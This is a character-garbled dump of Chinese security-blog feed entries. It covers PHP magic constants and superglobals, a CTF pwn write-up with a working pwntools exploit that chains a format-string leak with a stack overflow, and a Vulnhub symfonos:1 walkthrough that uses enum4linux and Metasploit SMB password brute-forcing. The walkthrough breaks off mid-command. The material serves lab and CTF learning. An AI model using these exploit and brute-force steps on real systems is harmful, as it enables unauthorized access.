title="é­”æœ¯å¸¸é‡"></a>é­”æœ¯å¸¸é‡</h3><p>é­”æœ¯å¸¸é‡æ˜¯ä¼šæ ¹æ®ç¯å¢ƒçš„å˜åŒ–è€Œå‘ç”Ÿå˜åŒ–çš„å˜é‡</p><p>ç”±<code>__xxx__</code>å½¢å¼æ„æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> <span class="comment">// å½“å‰PHPæ–‡ä»¶çš„ç»å¯¹è·¯å¾„è·¯å¾„(ä¼šå¸¦ä¸Šæ–‡ä»¶å)</span></span><br><span class="line"><span class="keyword">__DIR__</span><span class="comment">// å½“å‰æ–‡ä»¶çš„ç›®å½•(ç»å¯¹è·¯å¾„)</span></span><br><span class="line"><span class="keyword">__LINE__</span> <span class="comment">// å½“å‰PHPæ–‡ä»¶ä¸­æ‰€åœ¨çš„è¡Œå·</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> <span class="comment">// å½“å‰å‡½æ•°åï¼Œåªå¯¹å‡½æ•°å†…è°ƒç”¨èµ·ä½œç”¨</span></span><br><span class="line"><span class="keyword">__CLASS__</span> <span class="comment">// å½“å‰ç±»åï¼Œåªå¯¹ç±»èµ·ä½œç”¨</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span><span class="comment">// å½“å‰æ‰€å±çš„å‘½åç©ºé—´</span></span><br><span class="line"><span class="keyword">__METHOD__</span> <span class="comment">// è¡¨ç¤ºç±»æ–¹æ³•åï¼Œæ¯”å¦‚B::test</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¸­çš„é¢„å®šä¹‰å˜é‡</title>
      <link href="/php_predefine.html"/>
      <url>/php_predefine.html</url>
      
        <content type="html"><![CDATA[<p>phpä¸­çš„é¢„å®šä¹‰å˜é‡</p><p>å‚è§<a href="https://www.php.net/manual/zh/reserved.variables.php">phpæ‰‹å†Œ</a></p><a id="more"></a><h2 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>:<span class="comment">// ä»¥getæ–¹å¼æäº¤çš„æ•°æ®</span></span><br><span class="line"><span class="variable">$_POST</span>:<span class="comment">// ä»¥postæ–¹å¼æäº¤çš„æ•°æ®</span></span><br><span class="line"><span class="variable">$_REQUEST</span>:<span class="comment">// getå’Œpostæäº¤çš„æ•°æ®</span></span><br><span class="line"><span class="variable">$GLOBALS</span>:<span class="comment">// phpä¸­çš„å…¨å±€å˜é‡</span></span><br><span class="line"><span class="variable">$_SERVER</span>:<span class="comment">// æœåŠ¡å™¨ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$_SESSION</span>:  <span class="comment">// sessionä¼šè¯æ•°æ®</span></span><br><span class="line"><span class="variable">$_COOKIE</span>:<span class="comment">// cookie ä¼šè¯æ•°æ®</span></span><br><span class="line"><span class="variable">$_ENV</span>:<span class="comment">// ç¯å¢ƒä¿¡æ¯</span></span><br><span class="line"><span class="variable">$_FILES</span>:<span class="comment">// ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$php_errormsg</span></span><br></pre></td></tr></table></figure><h3 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“è®¿é—®<code>xx.php?cmd=1</code>æ—¶ï¼Œä¼šæ˜¾ç¤º<code>1</code>    </p><h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“ä»¥<code>post</code>æ–¹å¼å‘é€<code>cmd=1</code>æ—¶ï¼Œä¼šæ˜¾ç¤º<code>1</code></p><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æ”¶åˆ°ä¸€ä¸ª<code>name</code>å˜é‡(ä¸è®º<code>get</code>è¿˜æ˜¯<code>post</code>)</p><h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="comment">// ç”¨æˆ·çš„ IP åœ°å€</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>];<span class="comment">// æœåŠ¡å™¨çš„ IP åœ°å€</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>];<span class="comment">// æœåŠ¡å™¨çš„ä¸»æœºå</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>];<span class="comment">// è„šæœ¬æ‰€åœ¨çš„æ–‡æ¡£æ ¹ç›®å½•ã€‚åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ã€‚</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];<span class="comment">// è·å–å½“å‰ç½‘é¡µåœ°å€ï¼ˆä¸å«åŸŸåéƒ¨åˆ†ï¼‰</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];<span class="comment">// è·å–å½“å‰ç½‘é¡µåœ°å€ä¸­çš„æ‰€æœ‰getæ•°æ®ï¼Œä½†åªæ˜¯ä¸€ä¸ªæ•´ä½“çš„å­—ç¬¦ä¸²è€Œå·²</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>];<span class="comment">// è„šæœ¬çš„ç»å¯¹è·¯å¾„ </span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>]<span class="comment">// åœ¨PHP 5.1ä¹‹ååŠ å…¥ï¼Œä¿å­˜äº†å‘é€è¯·æ±‚çš„æ—¶é—´æˆ³</span></span><br></pre></td></tr></table></figure><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$_GLOBALS"></a>$_GLOBALS</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;var1&#x27;</span>];</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå˜é‡ä¸»è¦æ˜¯ç”¨äº</p><p>â€‹    åœ¨å±€éƒ¨èŒƒå›´ä¸å¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡çš„æ—¶å€™æœ‰éœ€è¦ä½¿ç”¨è¯¥å˜é‡çš„å€¼ï¼Œæ­¤æ—¶å°±å¯ä»¥ç”¨å®ƒæ¥å–å¾—è¯¥å…¨å±€å˜é‡çš„å€¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mainå‡½æ•°çš„ROPé—®é¢˜</title>
      <link href="/main_rop.html"/>
      <url>/main_rop.html</url>
      
        <content type="html"><![CDATA[<p>ç¤ºä¾‹ï¼šå®‰æ’7æœˆæœˆèµ›ç­¾åˆ°é¢˜</p><p><strong>æœ¬æ–‡ä¸»è¦æ¢è®¨çš„æ˜¯mainå‡½æ•°çš„ROPé—®é¢˜ï¼Œä¸æ˜¯é¢˜è§£ï¼ˆ</strong></p><a id="more"></a><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><p>ä¼ªCä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nCan you solve this sign-in problem?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„æ±‡ç¼–ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.text:08048595 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048595                 public main</span><br><span class="line">.text:08048595 main            proc near               ; DATA XREF: _start+17â†‘o</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 var_28          &#x3D; byte ptr -28h</span><br><span class="line">.text:08048595 s               &#x3D; byte ptr -18h</span><br><span class="line">.text:08048595 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:08048595 argc            &#x3D; dword ptr  8</span><br><span class="line">.text:08048595 argv            &#x3D; dword ptr  0Ch</span><br><span class="line">.text:08048595 envp            &#x3D; dword ptr  10h</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048599                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804859C                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804859F                 push    ebp</span><br><span class="line">.text:080485A0                 mov     ebp, esp</span><br><span class="line">.text:080485A2                 push    ecx</span><br><span class="line">.text:080485A3                 sub     esp, 24h</span><br><span class="line">.text:080485A6                 call    init</span><br><span class="line">.text:080485AB                 sub     esp, 0Ch</span><br><span class="line">.text:080485AE                 push    offset s        ; &quot;what&#39;s your name:&quot;</span><br><span class="line">.text:080485B3                 call    _puts</span><br><span class="line">.text:080485B8                 add     esp, 10h</span><br><span class="line">.text:080485BB                 sub     esp, 0Ch</span><br><span class="line">.text:080485BE                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C1                 push    eax             ; s</span><br><span class="line">.text:080485C2                 call    _gets</span><br><span class="line">.text:080485C7                 add     esp, 10h</span><br><span class="line">.text:080485CA                 sub     esp, 0Ch</span><br><span class="line">.text:080485CD                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485D0                 push    eax             ; format</span><br><span class="line">.text:080485D1                 call    _printf</span><br><span class="line">.text:080485D6                 add     esp, 10h</span><br><span class="line">.text:080485D9                 sub     esp, 0Ch</span><br><span class="line">.text:080485DC                 push    offset aCanYouSolveThi ; &quot;\nCan you solve this sign-in problem?&quot;</span><br><span class="line">.text:080485E1                 call    _puts</span><br><span class="line">.text:080485E6                 add     esp, 10h</span><br><span class="line">.text:080485E9                 sub     esp, 0Ch</span><br><span class="line">.text:080485EC                 lea     eax, [ebp+var_28]</span><br><span class="line">.text:080485EF                 push    eax             ; s</span><br><span class="line">.text:080485F0                 call    _gets</span><br><span class="line">.text:080485F5                 add     esp, 10h</span><br><span class="line">.text:080485F8                 mov     eax, 0</span><br><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br><span class="line">.text:08048604 ; &#125; &#x2F;&#x2F; starts at 8048595</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹å¾ˆæ˜æ˜¾å­˜åœ¨<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»¥åŠæ ˆæº¢å‡º</strong></p><h2 id="mainå‡½æ•°çš„å¼€å¤´ç»“å°¾"><a href="#mainå‡½æ•°çš„å¼€å¤´ç»“å°¾" class="headerlink" title="mainå‡½æ•°çš„å¼€å¤´ç»“å°¾"></a>mainå‡½æ•°çš„å¼€å¤´ç»“å°¾</h2><p>å¯¹äºmainå‡½æ•°çš„ROPç›¸æ¯”äºå…¶ä»–å‡½æ•°æœ‰å¾ˆå¤§çš„ä¸ä¸€æ ·ï¼Œæœ€é‡è¦çš„åœ°æ–¹å°±æ˜¯æœ€å‰å’Œæœ€åé‚£å‡ æ¡è¯­å¥</p><h3 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h3><h4 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea ecx, [esp+4]</span><br><span class="line">and esp, 0xfffffff0</span><br><span class="line">push [ecx-4]</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure><h4 id="å¯¹åº”çš„æ ˆå¸§"><a href="#å¯¹åº”çš„æ ˆå¸§" class="headerlink" title="å¯¹åº”çš„æ ˆå¸§"></a>å¯¹åº”çš„æ ˆå¸§</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+; &lt;---- esp</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |; [ecx - 4] &#x3D;&#x3D; [ret]</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+; &lt;---- ecx</span><br></pre></td></tr></table></figure><h4 id="è§£é‡Šï¼š"><a href="#è§£é‡Šï¼š" class="headerlink" title="è§£é‡Šï¼š"></a>è§£é‡Šï¼š</h4><p>ç”±äºåœ¨<code>call main</code>çš„æ—¶å€™ï¼Œ<code>esp</code>æŒ‡å‘çš„å°±æ˜¯<code>mainçš„ret</code>ä¹Ÿå°±æ˜¯<code>__libc_start_main+offset</code>çš„ä½ç½®ï¼Œç„¶å<code>lea ecx, [esp-4]</code>ä½¿å¾—<code>ecx</code>æŒ‡å‘äº†<code>ret</code>ä¹‹åçš„ä¸€ä¸ªåœ°å€ã€‚ç„¶åç»è¿‡<code>and esp, 0xfffffff0</code>ä¹‹åï¼Œ<code>esp</code>å‘ä¸Šå˜åŒ–äº†ä¸€å®šçš„ç©ºé—´ï¼Œåˆé€šè¿‡<code>push ecx</code>èµ·åˆ°äº†ä¿å­˜çš„ä½œç”¨</p><h3 id="ç»“æŸ"><a href="#ç»“æŸ" class="headerlink" title="ç»“æŸ"></a>ç»“æŸ</h3><h4 id="æ±‡ç¼–-1"><a href="#æ±‡ç¼–-1" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><h4 id="å¯¹åº”çš„æ ˆå¸§-1"><a href="#å¯¹åº”çš„æ ˆå¸§-1" class="headerlink" title="å¯¹åº”çš„æ ˆå¸§"></a>å¯¹åº”çš„æ ˆå¸§</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+; &lt;---- ebp+var_4</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+; &lt;---- ecx(stack)</span><br></pre></td></tr></table></figure><h4 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h4><p>mainå‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠ<code>ebp-4</code>é‡Œé¢ä¿å­˜çš„<code>åŸecx</code>å¯„å­˜å™¨çš„å€¼è¿˜åŸï¼Œç„¶åæ ¹æ®è¿™ä¸ª<code>ecx</code>çš„å€¼ï¼Œæ‰¾åˆ°çœŸæ­£çš„<code>ret</code></p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>å› ä¸ºROPéœ€è¦åŠ«æŒè¿”å›åœ°å€ï¼Œé‚£ä¹ˆåœ¨ä¸çŸ¥é“åŸ<code>ecx</code>å€¼çš„æƒ…å†µä¸‹æ˜¯æ— æ³•çœŸæ­£åŠ«æŒ<code>ret</code>çš„ï¼Œæ‰€ä»¥ç»™äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼æ ˆå†…çš„å€¼ï¼Œåœ¨æ³„æ¼äº†å€¼ä¹‹åå°±å˜å¾—ç®€å•äº†</p><h3 id="é™„ä¸Šexp"><a href="#é™„ä¸Šexp" class="headerlink" title="é™„ä¸Šexp"></a>é™„ä¸Šexp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./qiandao&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;183.129.189.60&quot;, 10013)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804857D</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">formats = <span class="string">&quot;%13$p&quot;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;name:&quot;</span>, formats)</span><br><span class="line">sh.recvline()</span><br><span class="line">bp = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">cx = bp - <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">print(<span class="string">&quot;bp ==&gt; &quot;</span> + <span class="built_in">hex</span>(bp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;b *0x080485FD&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + p32(cx) + p32(backdoor) + p32(cx - <span class="number">8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;problem&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> ROP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub symfonos:1é¶æœº</title>
      <link href="/symfonos-1.html"/>
      <url>/symfonos-1.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ symfonos-1 é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="Symfonos-1"><a href="#Symfonos-1" class="headerlink" title="Symfonos:1"></a>Symfonos:1</h1><p>é¶æœºçš„ipåœ°å€ä¸º<code>192.168.2.177</code></p><p>å¼€æ”¾ç«¯å£<code>22 80 139 445</code></p><h2 id="445"><a href="#445" class="headerlink" title="445"></a>445</h2><p>ç†Ÿæ‚‰çš„445ç«¯å£è¿è¡Œäº†ç†Ÿæ‚‰çš„æœåŠ¡ï¼ˆsmbï¼‰</p><img src="symfonos:1/image-20200727212653785.png" alt="image-20200727212653785" style="zoom:50%;" /><p>å…ˆä½¿ç”¨<code>enum4linux</code>å¾—åˆ°é¶æœºçš„ç”¨æˆ·</p><p><code>enum4linux -U 192.168.2.177</code>ï¼Œå¾—åˆ°äº†ç”¨æˆ·å<code>helios</code></p><img src="symfonos:1/image-20200727213047872.png" alt="image-20200727213047872" style="zoom:50%;" /><p>ç›´æ¥ä¸Š<code>msfconsole</code>çš„<code>smb_login</code>æ¨¡å—å»çˆ†ç ´å¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_login</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; set rhost 192.168.2.177</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; set smbuser helios</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; set pass_file /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="symfonos:1/image-20200727213359202.png" alt="image-20200727213359202" style="zoom:50%;" /><p>å¾—åˆ°äº†å¯†ç ä¸º<code>qwerty</code></p><p>ç„¶åä½¿ç”¨<code>smbclient</code>ç™»å½•</p><img src="symfonos:1/image-20200727213638693.png" alt="image-20200727213638693" style="zoom:50%;" /><p>éƒ½éå†ä¸€éæ‰¾åˆ°ä¸‰ä¸ªæ–‡ä»¶</p><img src="symfonos:1/image-20200727213738279.png" alt="image-20200727213738279" style="zoom:50%;" /><p>åŸæ¥åœ¨<code>anonymous</code>ä¸‹æœ‰<code>attention.txt</code>å‘Šè¯‰äº†å¯†ç ï¼ˆä¸ç®¡äº†ï¼Œåæ­£çˆ†ç ´å‡ºæ¥äº†ï¼‰</p><p>ç„¶ååœ¨<code>todo.txt</code>ä¸‹å‘ç°äº†ä¸€ä¸ª<code>/h3l105</code>ï¼Œä¼°è®¡æ˜¯ä¸€ä¸ªç›®å½•</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>è®¿é—®ä¸€ä¸‹</p><img src="symfonos:1/image-20200727214045765.png" alt="image-20200727214045765" style="zoom:50%;" /><p>æ‰«æç›®å½•ä¹‹åæœ‰ä¸€ä¸ªå¥‡æ€ªçš„ç›®å½•ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ç”¨ï¼Œæƒ³åˆ°ä¸Šé¢çš„ç›®å½•ï¼Œè¯•ä¸€ä¸‹ï¼Œä½†æ˜¯å‘ç°è¿æ¥ä¸ä¸Šï¼Œä½œè€…åœ¨é¶æœºçš„æç¤ºä¸­ç»™äº†å¯èƒ½éœ€è¦ä¿®æ”¹<code>hosts</code>ï¼Œå¹¶ä¸”å·¦ä¸‹è§’ä¼šæœ‰æç¤º<code>æ­£åœ¨è§£æsymfonos.local</code>ã€‚</p><p>æ‰€ä»¥åœ¨<code>/etc/hosts</code>æ–‡ä»¶é‡Œé¢åŠ å…¥è§£æå°±è¡Œ</p><img src="symfonos:1/image-20200727214314836.png" alt="image-20200727214314836" style="zoom:50%;" /><p>ç„¶åè®¿é—®å¾—åˆ°æ˜¯ä¸€ä¸ªwordpressçš„ç½‘ç«™</p><img src="symfonos:1/image-20200727214401475.png" alt="image-20200727214401475" style="zoom:50%;" /><p>é‚£å°±ä½¿ç”¨<code>wpscan</code>æ‰«æä¸€ä¸‹ï¼Œå¾—åˆ°æœ‰ä¸¤ä¸ªæ’ä»¶</p><img src="symfonos:1/image-20200727214653033.png" alt="image-20200727214653033" style="zoom:50%;" /><p>æ‰¾ä¸€ä¸‹å­˜ä¸å­˜åœ¨æ¼æ´</p><p><code>searchsploit mail 